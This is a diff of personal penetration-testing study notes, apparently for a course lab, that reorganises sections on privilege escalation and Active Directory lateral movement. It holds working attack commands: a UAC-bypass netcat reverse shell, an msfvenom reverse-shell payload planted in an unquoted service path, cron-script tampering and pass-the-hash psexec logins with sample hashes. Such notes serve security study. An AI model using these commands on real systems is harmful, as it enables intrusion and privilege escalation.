@@ -2032,8 +2032,6 @@ Refer to PDF.
 ### Information Gathering
 #### Manual Enumeration
 ****Windows****
-https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
-https://github.com/carlospolop/PEASS-ng/releases/tag/20230413-7f846812
 - `systeminfo` to gather basic information about the system
 - `whoami` displays the username the shell is running as (`whoami /priv` to check the current user's permissions)
 - We can pass the discovered username as an argument to `net user` (e.g. `net user student`)
@@ -2054,7 +2052,26 @@ The first required flag `-t` is the "Process creation mode". The documentation s
 
 Next, the `-p` flag specifies the program we are trying to run. In this case, we can use the same backdoored `whoami.exe` binary that we used previously.
 
-Finally, Juicy Potato allows us to specify an arbitrary port for the COM server to listen on with the `-l` flag.
+Finally, Juicy Potato allows us to specify an arbitrary port for the COM server to listen on with the `-l` flag. 
+
+Potatoes:
+`SeImpersonate` or `SeAssignPrimaryToken` privileges.
+https://jlajara.gitlab.io/Potatoes_Windows_Privesc
+https://github.com/ohpe/juicy-potato
+Check privileges with `whoami /priv`
+https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato
+https://github.com/ohpe/juicy-potato/releases
+
+**JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, can try PrintSpoofer, RoguePotato, SharpEfsPotato
+
+PrintSpoofer:
+https://github.com/itm4n/PrintSpoofer
+`wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe`
+### Linux Privilege Escalation
+- Insecure file permissions
+    - Cron job
+        - Find out which cron job is run by root, and amend the script using `echo '<command>' > <cronfile>`
+    - `/etc/passwd`
 
 - Networking Interfaces: `ipconfig /all`
 - Routing Tables: `route print`
@@ -2078,10 +2095,40 @@ reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 ```
 If this setting is enabled, we could craft an MSI file and run it to elevate our privileges.
 
+- UAC bypass by editing registry: Check for permissions first `whoami /priv`.
+    - `whoami /groups` if it reveals a `Medium Mandatory Level`, most likely it is a UAC bypass that is required
+    - `fodhelper.exe` can possibly be found in `C:\Windows\sysnative`
+    - https://github.com/CsEnox/EventViewer-UACBypass (Use this `Invoke-EventViewer.ps1`)
+	- Run `Invoke-EventViewer.ps1`
+	- Transfer `nc.exe` and run the following:
+	```
+	PS: Import-Module .\Invoke-EventViewer.ps1
+	powershell
+	Invoke-EventViewer nc.exe
+	Invoke-EventViewer cmd.exe
+	Invoke-EventViewer "C:\Windows\Tasks\nc.exe -nv <IP> <PORT> -e cmd.exe"
+	```
+	- It should catch a reverse shell with high mandatory level.
+    - `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
+- Exploit insecure file permissions on services that run as `nt authority\system`
+- Unquoted service paths
+	- `PrivescCheck.ps1` can be used to find unquoted service paths
+	- Create a `msfvenom` `.exe` payload to be placed in that file path so that it runs automatically on reboot (?)
+	```
+	This payload was created because an unquoted service path C:\Program Files\Zen Service Desk\Zen... was found. zen.exe was created so that it will auto-run the .exe file upon reboot (in this example, the service auto starts, so a reboot of the system is all is required)
+	msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.185 LPORT=8888 -f exe -o zen.exe
+	```
+- Kernel Vulnerabilities
+- Refer to PDF
+
+#### Additional Tools/Automated Elevation Checks (Windows)
+- `windows-privesc-check2.exe --dump`
+- https://github.com/itm4n/PrivescCheck
+- https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+- https://github.com/carlospolop/PEASS-ng/releases/tag/20230413-7f846812
+	
 **Linux**
 https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst
-https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
-https://github.com/carlospolop/PEASS-ng/releases/tag/20230413-7f846812
 - Use `id` to gather user context information (e.g. what groups they are a part of)
 - `cat /etc/passwd` to enumerate users
     - `www-data` indicates a web server is likely installed
@@ -2125,50 +2172,11 @@ uname -a
 - Check for `ssh` permissions - who can login via `ssh`: `grep -v '^#' /etc/ssh/sshd_config | uniq`
 - If managed to login, check what groups the user is a part of: 
 
-#### Automated Enumeration
-Windows: `windows-privesc-check2.exe --dump`
-Linux: `./unix-privesc-check standard > output.txt`
-
-### Windows Privilege Escalation
-- UAC bypass by editing registry: Check for permissions first `whoami /priv`.
-    - `whoami /groups` if it reveals a `Medium Mandatory Level`, most likely it is a UAC bypass that is required
-    - `fodhelper.exe` can possibly be found in `C:\Windows\sysnative`
-    - https://github.com/CsEnox/EventViewer-UACBypass (Use this `Invoke-EventViewer.ps1`)
-	- Run `Invoke-EventViewer.ps1`
-	- Transfer `nc.exe` and run the following:
-	```
-	PS: Import-Module .\Invoke-EventViewer.ps1
-	powershell
-	Invoke-EventViewer nc.exe
-	Invoke-EventViewer cmd.exe
-	Invoke-EventViewer "C:\Windows\Tasks\nc.exe -nv <IP> <PORT> -e cmd.exe"
-	```
-	- It should catch a reverse shell with high mandatory level.
-    - `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
-- Exploit insecure file permissions on services that run as `nt authority\system`
-- Unquoted service paths
-- Kernel Vulnerabilities
-- Refer to PDF
-
-Potatoes:
-`SeImpersonate` or `SeAssignPrimaryToken` privileges.
-https://jlajara.gitlab.io/Potatoes_Windows_Privesc
-https://github.com/ohpe/juicy-potato
-Check privileges with `whoami /priv`
-https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato
-https://github.com/ohpe/juicy-potato/releases
-
-**JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, can try PrintSpoofer, RoguePotato, SharpEfsPotato
-
-PrintSpoofer:
-https://github.com/itm4n/PrintSpoofer
-`wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe`
-### Linux Privilege Escalation
-- Insecure file permissions
-    - Cron job
-        - Find out which cron job is run by root, and amend the script using `echo '<command>' > <cronfile>`
-    - `/etc/passwd`
-    
+#### Additional Notes/Automated Elevation Checks
+- `./unix-privesc-check standard > output.txt`
+- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+- https://github.com/carlospolop/PEASS-ng/releases/tag/20230413-7f846812
+	
 ## Password Attacks
 ### Creating Wordlists
 Kali has some wordlists in `/usr/share/wordlists/` directory. But it would be effective to add words and phrases specific to our target.
@@ -2555,18 +2563,6 @@ We can use an existing implementation (https://web.archive.org/web/2022022519004
 .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
 ```
 
-**Note**: You may use `impacket-psexec` to login with any credentials that you have obtained. E.g. if you have obtained SPN hash for a SQL server, this command would work:
-```
-impacket-psexec sqlserver:<password>@<IP>
-
-impacket-psexec -hashes <lmhash/MsCachev2>:<NTLM> <user>@10.11.1.122
-
-impacket-psexec 'SVCLIENT73 /administrator'@10.11.1.24 -hashes ':ee0c207898a5bccc01f38115019ca2fb'
-```
-`MsCachev2` can be obtained by executing `lsadump::cache` in `mimikatz`.
-
-Can also try `evil-winrm` and `crackmapexec`.
-
 ### AD Lateral Movement
 #### Pass The Hash
 Only for NTLM authentication.
@@ -2585,6 +2581,17 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f
 .
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 offsec.local/Administrator@192.168.159.57
 ```
+**Note**: You may use `impacket-psexec` to login with any credentials that you have obtained. E.g. if you have obtained SPN hash for a SQL server, this command would work:
+```
+impacket-psexec sqlserver:<password>@<IP>
+
+impacket-psexec -hashes <lmhash/MsCachev2>:<NTLM> <user>@10.11.1.122
+
+impacket-psexec 'SVCLIENT73 /administrator'@10.11.1.24 -hashes ':ee0c207898a5bccc01f38115019ca2fb'
+```
+`MsCachev2` can be obtained by executing `lsadump::cache` in `mimikatz`.
+
+Can also try `evil-winrm` and `crackmapexec`.
 
 #### Overpass The Hash
 The essence of the overpass the hash technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication. 
